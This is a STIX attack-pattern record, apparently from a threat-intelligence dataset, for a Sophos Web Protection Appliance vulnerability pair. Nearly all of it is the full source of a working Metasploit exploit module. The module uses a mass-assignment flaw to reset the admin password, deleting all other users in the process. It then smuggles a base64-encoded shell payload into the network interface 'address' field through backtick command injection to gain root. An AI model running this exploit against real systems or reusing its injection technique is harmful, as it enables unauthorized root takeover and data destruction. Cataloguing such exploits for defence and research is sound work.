{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8274c537-6403-4926-9e41-2d00c420dbe0",
    "created": "2024-08-14T17:01:34.371566Z",
    "modified": "2024-08-14T17:01:34.371571Z",
    "name": "Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution",
    "description": " This module takes advantage of two vulnerabilities in order to gain remote code execution as root as an otherwise non-privileged authorized user. By taking advantage of a mass assignment vulnerability that allows an unprivileged authenticated user to change the administrator's password hash, the module updates the password to login as the admin to reach the second vulnerability. No server-side sanitization is done on values passed when configuring a static network interface. This allows an administrator user to run arbitrary commands in the context of the web application which is root when configuring the network interface. This module will inadvertently delete any other users that may have been present as a side effect of changing the admin's password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/sophos_wpa_iface_exec.rb",
            "external_id": "sophos_wpa_iface_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2849"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2850"
        },
        {
            "source_name": "reference",
            "url": "http://www.zerodayinitiative.com/advisories/ZDI-14-069/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution',\n      'Description'    => %q{\n        This module takes advantage of two vulnerabilities in order to gain remote code execution as root\n        as an otherwise non-privileged authorized user. By taking advantage of a mass assignment\n        vulnerability that allows an unprivileged authenticated user to change the administrator's\n        password hash, the module updates the password to login as the admin to reach the second vulnerability.\n        No server-side sanitization is done on values passed when configuring a static network interface.\n        This allows an administrator user to run arbitrary commands in the context of the web application,\n        which is root when configuring the network interface. This module will inadvertently delete\n        any other users that may have been present as a side effect of changing the admin's password.\n      },\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-2849'],\n          ['CVE', '2014-2850'],\n          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-069/']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 500,\n          'DisableNops' => true,\n          'BadChars'    => \"\", #base64 encryption ftw!\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' =>  'generic telnet'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Sophos Web Protection Appliance 3.8.1.1', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-04-08'\n      ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with', nil]),\n        OptString.new('TARGETURI', [true, 'The target URI', '/']),\n        Opt::RPORT(443)\n      ],\n      self.class\n    )\n  end\n\n  def exploit\n      init = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php')\n      })\n\n      if !init or !init.body\n        fail_with(Failure::Unreachable, \"Could not connect to host\")\n      end\n\n      print_status(\"Getting STYLE key...\")\n\n      style = ''\n      init.body.each_line do |line|\n        next if line !~ /name=\"STYLE\" value=\"(.*)\"/\n        style = $1\n      end\n\n      if style == ''\n        fail_with(Failure::UnexpectedReply, \"Could not find style key.\")\n      end\n\n      post = {\n       'STYLE' => style,\n       'destination' => '',\n       'section' => '',\n       'username' => datastore['USERNAME'],\n       'password' => datastore['PASSWORD']\n      }\n\n      print_status(\"Authenticating as \" + datastore['USERNAME'])\n      login = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, '/index.php'),\n        'method' => 'POST',\n        'encode_params' => false,\n        'vars_post' => post,\n        'vars_get' => {\n          'c' => 'login',\n        }\n      })\n\n      if !login or login.code != 200 or login.body !~ /#{datastore['USERNAME']}<\\/a>/\n        fail_with(Failure::NoAccess, \"Authentication failed\")\n      end\n\n      #I don't know what salt is being used to hash these\n      #passwords (probably in js somewhere), so I have\n      #to use a static one that I saw being POSTed while\n      #exploring, it is 'notpassword'.\n      #\n      #This will actually delete every other user that exists\n      #except for admin, whose password will be changed\n      #\n      #whoops\n      admin_hash = '[{\"id\": \"default_admin\", \"username\": \"admin\", \"name\": \"Default Administrator\"'\n      admin_hash << ', \"password\": \"70ec23d3e019a307081732c0162b2733\", \"description\": \"Default '\n      admin_hash << 'Administrator Account\", \"admin\": true, \"roles\": [\"admin\"], \"reporting_groups\"'\n      admin_hash << ': [], \"user_id\": 0}]'\n\n      post = {\n        'action' => 'save',\n        'STYLE' => style,\n        'username' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['USERNAME'])),\n        'current' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['PASSWORD'])),\n        'new' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['PASSWORD'])),\n        'admins' => admin_hash\n      }\n\n      print_status(\"Changing old password hash to notpassword\")\n      passchange = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, '/index.php'),\n        'method' => 'POST',\n        'vars_post' => post,\n        'vars_get' => {\n          'c' => 'change_password'\n        }\n      })\n\n      if !passchange or passchange.code != 200\n        fail_with(Failure::UnexpectedReply, \"Couldn't update admin's password\")\n      end\n\n      print_status(\"Logging in as the admin now\")\n      init = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php')\n      })\n\n      if !init or init.code != 200\n        fail_with(Failure::UnexpectedReply, \"Couldn't reget index page for admin auth\")\n      end\n\n      init.body.each_line do |line|\n        next if line !~ /name=\"STYLE\" value=\"(.*)\"/\n        style = $1\n      end\n\n      post = {\n        'STYLE' => style,\n        'destination' => '',\n        'section' => '',\n        'username' => 'admin',\n        'password' => 'notpassword'\n      }\n\n      login = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' =>  'POST',\n        'vars_post' => post,\n        'vars_get' => {\n            'c' => 'login',\n        }\n      })\n\n      if !login or login.code != 200 or login.body !~ /admin<\\/a>/\n        fail_with(Failure::NoAccess, \"Couldn't login as admin\")\n      end\n\n      pay = Rex::Text.uri_encode(Rex::Text.encode_base64(payload.encoded))\n      post = {\n        'STYLE' => style,\n        'dhcp' => 'no',\n        'address' => \"192.16`echo #{pay}|base64 --decode|sh`8.1.16\",\n        'gateway' => '192.168.1.254',\n        'sb_bridge' => 'explicit',\n        'netmask' => '255.255.255.0',\n        'sb_linktype' => 'auto',\n        'dns' => 'yes',\n        'dns1' => '192.168.1.254',\n        'dns2' => '',\n        'dns3' => ''\n      }\n\n      print_status(\"Sending payload\")\n      send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'vars_post' => post,\n        'vars_get' => {\n            'c' => 'netinterface',\n        }\n      })\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-08",
    "x_mitre_platforms": [
        "['unix']"
    ]
}